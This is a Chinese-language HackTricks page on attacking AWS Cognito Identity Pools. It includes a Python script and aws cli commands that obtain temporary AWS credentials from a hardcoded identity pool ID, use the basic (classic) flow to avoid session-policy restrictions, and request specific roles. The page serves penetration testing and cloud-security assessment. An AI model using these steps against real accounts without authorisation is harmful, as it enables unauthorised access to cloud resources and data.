# Cognito身份池

<details>

<summary><strong>支持HackTricks并获得福利！</strong></summary>

* 如果您想在HackTricks中看到您的公司广告，或者如果您想访问PEASS的最新版本或下载PDF格式的HackTricks，请查看[**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)！
* 获取[**官方PEASS和HackTricks周边产品**](https://peass.creator-spring.com)
* 发现[**PEASS家族**](https://opensea.io/collection/the-peass-family)，我们的独家[**NFT**](https://opensea.io/collection/the-peass-family)收藏品
* **加入** 💬 [**Discord群组**](https://discord.gg/hRep4RUj7f) 或 [**Telegram群组**](https://t.me/peass) 或 **关注**我的 **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/carlospolopm)**。**
* **通过向** [**HackTricks**](https://github.com/carlospolop/hacktricks) **和** [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) **github仓库提交PR来分享您的黑客技巧。**

</details>

## 基本信息

使用身份池，您的用户可以**获取临时的AWS凭证来访问AWS服务**，例如Amazon S3和DynamoDB。身份池支持匿名访客用户，以及以下身份提供者，您可以使用它们来对身份池的用户进行身份验证：

* Amazon Cognito用户池
* 通过Facebook、Google、Login with Amazon和Sign in with Apple进行社交登录
* OpenID Connect (OIDC)提供者
* SAML身份提供者
* 开发者认证身份

### Cognito Sync

要生成身份池会话，您首先需要**生成一个身份ID**。这个身份ID是**该用户会话的标识**。这些标识可以有多达20个数据集，每个数据集可以存储多达1MB的键值对。

这对于**保留用户信息**（始终使用相同的身份ID的用户）非常有用。

此外，服务**cognito-sync**是允许**管理和同步此信息**的服务（在数据集中发送信息、流和SNS消息等）。

## 访问IAM角色

### 未经身份验证

攻击者所需知道的唯一信息，以便作为未经身份验证的用户在Cognito应用程序中**获取AWS凭证**的是**身份池ID**，并且此**ID必须在Web/移动应用程序中硬编码**以供其使用。一个ID看起来像这样：`eu-west-1:098e5341-8364-038d-16de-1865e435da3b`（无法通过暴力破解获得）。

{% hint style="success" %}
通过默认方式创建的**IAM Cognito未经身份验证角色**被称为`Cognito_<Identity Pool名称>Unauth_Role`
{% endhint %}

如果您发现一个硬编码的身份池ID并且允许未经身份验证的用户，您可以使用以下方法获取AWS凭证：
```python
import requests

region = "us-east-1"
id_pool_id = 'eu-west-1:098e5341-8364-038d-16de-1865e435da3b'
url = f'https://cognito-identity.{region}.amazonaws.com/'
headers = {"X-Amz-Target": "AWSCognitoIdentityService.GetId", "Content-Type": "application/x-amz-json-1.1"}
params = {'IdentityPoolId': id_pool_id}

r = requests.post(url, json=params, headers=headers)
json_resp = r.json()

if not "IdentityId" in json_resp:
print(f"Not valid id: {id_pool_id}")
exit

IdentityId = r.json()["IdentityId"]

params = {'IdentityId': IdentityId}

headers["X-Amz-Target"] = "AWSCognitoIdentityService.GetCredentialsForIdentity"
r = requests.post(url, json=params, headers=headers)

print(r.json())
```
或者您可以使用以下的 **aws cli 命令**：
```bash
aws cognito-identity get-id --identity-pool-id <identity_pool_id> --no-sign
aws cognito-identity get-credentials-for-identity --identity-id <identity_id> --no-sign
```
{% hint style="warning" %}
请注意，默认情况下，未经身份验证的Cognito用户**无法获得任何权限，即使通过策略分配了权限**。请查看以下部分。
{% endhint %}

### 增强认证流程与基本认证流程

前一节遵循了**默认的增强认证流程**。该流程为生成的IAM角色会话设置了一个**限制性的**[**会话策略**](../../aws-basic-information/#session-policies)。该策略只允许会话使用[**此列表中的服务**](https://docs.aws.amazon.com/cognito/latest/developerguide/iam-roles.html#access-policies-scope-down-services)（即使角色具有访问其他服务的权限）。

然而，如果**身份池启用了"基本（经典）流程"**，用户将能够使用该流程获取会话，该会话**不会有限制性的会话策略**。

{% code overflow="wrap" %}
```bash
# Get auth ID
aws cognito-identity get-id --identity-pool-id <identity_pool_id> --no-sign

# Get login token
aws cognito-identity get-open-id-token --identity-id <identity_id> --no-sign

# Use login token to get IAM session creds
## If you don't know the role_arn use the previous enhanced flow to get it
aws sts assume-role-with-web-identity --role-arn "arn:aws:iam::<acc_id>:role/<role_name>" --role-session-name sessionname --web-identity-token <token> --no-sign
```
{% endcode %}

{% hint style="warning" %}
如果您收到此**错误**，那是因为**基本流程未启用（默认）**

`An error occurred (InvalidParameterException) when calling the GetOpenIdToken operation: Basic (classic) flow is not enabled, please use enhanced flow.`
{% endhint %}

拥有一组 IAM 凭据后，您应该检查[您拥有的访问权限](../../#whoami)并尝试[提升权限](../../aws-privilege-escalation/)。

### 已认证

{% hint style="info" %}
请记住，**已认证用户**可能会被授予**不同的权限**，因此如果您可以在应用程序内**注册**，请尝试这样做并获取新的凭据。
{% endhint %}

对于**已认证用户访问身份池**，可能还可以使用**角色**。

为此，您可能需要访问**身份提供者**。如果是**Cognito 用户池**，也许您可以滥用默认行为并**自己创建新用户**。

{% hint style="success" %}
通过 IAM Cognito 认证角色默认称为 `Cognito_<Identity Pool name>Auth_Role`
{% endhint %}

无论如何，**以下示例**假设您已经登录到用于访问身份池的**Cognito 用户池**中（不要忘记还可以配置其他类型的身份提供者）。

<pre class="language-bash"><code class="lang-bash">aws cognito-identity get-id \
--identity-pool-id &#x3C;identity_pool_id> \
--logins cognito-idp.&#x3C;region>.amazonaws.com/&#x3C;YOUR_USER_POOL_ID>=&#x3C;ID_TOKEN>

# 从上一个命令的响应中获取 identity_id
aws cognito-identity get-credentials-for-identity \
--identity-id &#x3C;identity_id> \
--logins cognito-idp.&#x3C;region>.amazonaws.com/&#x3C;YOUR_USER_POOL_ID>=&#x3C;ID_TOKEN>


# 在 IdToken 中，您可以找到用户因为用户池组而具有的角色
# 使用 --custom-role-arn 获取特定角色的凭据
aws cognito-identity get-credentials-for-identity \
--identity-id &#x3C;identity_id> \
<strong>    --custom-role-arn &#x3C;role_arn> \
</strong>    --logins cognito-idp.&#x3C;region>.amazonaws.com/&#x3C;YOUR_USER_POOL_ID>=&#x3C;ID_TOKEN>
</code></pre>

{% hint style="warning" %}
可能会根据用户登录的**身份提供者**或甚至仅根据**用户**（使用声明）配置不同的 IAM 角色。因此，如果您可以通过相同或不同的提供者访问不同的用户，登录并访问所有用户的 IAM 角色可能是**值得的**。
{% endhint %}

<details>

<summary><strong>支持 HackTricks 并获得福利！</strong></summary>

* 如果您希望在 HackTricks 中看到您的**公司广告**，或者如果您想访问**PEASS 的最新版本或下载 PDF 格式的 HackTricks**，请查看[**订阅计划**](https://github.com/sponsors/carlospolop)！
* 获取[**官方 PEASS 和 HackTricks 商品**](https://peass.creator-spring.com)
* 发现[**PEASS 家族**](https://opensea.io/collection/the-peass-family)，我们的独家[**NFT**](https://opensea.io/collection/the-peass-family)收藏品
* **加入** 💬 [**Discord 群组**](https://discord.gg/hRep4RUj7f) 或 [**Telegram 群组**](https://t.me/peass) 或 **关注**我在 **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/carlospolopm)**。**
* **通过向** [**HackTricks**](https://github.com/carlospolop/hacktricks) 和 [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) **github 仓库提交 PR 来分享您的黑客技巧**。

</details>
